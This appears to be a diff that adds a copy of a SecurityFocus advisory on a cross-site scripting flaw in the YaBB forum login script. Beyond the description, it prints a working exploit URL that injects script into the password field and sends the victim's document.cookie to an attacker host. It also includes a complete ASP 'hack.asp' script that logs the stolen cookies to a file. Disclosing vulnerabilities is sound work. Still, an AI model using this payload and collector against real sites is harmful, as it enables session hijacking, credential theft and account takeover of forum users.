@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/6004/info
+
+A cross-site scripting vulnerability has been reported in the YaBB (Yet Another Bulletin Board) forum login script. HTML tags or script code are not sanitized from the error output of erroneous login attempts.
+
+As a result, it is possible for a remote attacker to create a malicious link to the login page of a site hosting the web forum. The malicious link may contain arbitrary HTML and script code in the password field. Visiting the link will cause attacker-supplied code to be executed in the web client of the user.
+
+It has been demonstrated that this vulnerability may be exploited to steal cookie-based authentication credentials. Furthermore, once an attacker has hijacked a user's session with the credentials it is possible to change that user's password without needing to further authenticate.
+
+http://example.com/forums/index.php?board=;action=login2&user=USERNAME&cookielength=120&passwrd=PASSWORD<script>window.location.href(%22http://www.attackersite.example.com/hack.asp?%22%2Bdocument.cookie)</script>
+
+An ASP script was also provided which will receive stolen cookie-based authentication credentials. 
+
+------------------------------- hack.asp ------------------------------------ <% Option Explicit Const ForWriting = 2 Const ForAppending = 8 Const Create = True Dim MyFile Dim FSO ' FileSystemObject Dim TSO ' TextStreamObject Dim Str Str = Request.ServerVariables("QUERY_STRING") MyFile = Server.MapPath("./db/log.txt") Set FSO = Server.CreateObject("Scripting.FileSystemObject") Set TSO = FSO.OpenTextFile(MyFile, ForAppending, Create) if (Str <> "") then TSO.WriteLine Str TSO.close Set TSO = Nothing Set FSO = Nothing %> You have just been hacked. ----------------------------------- EOF ----------------------------------- 
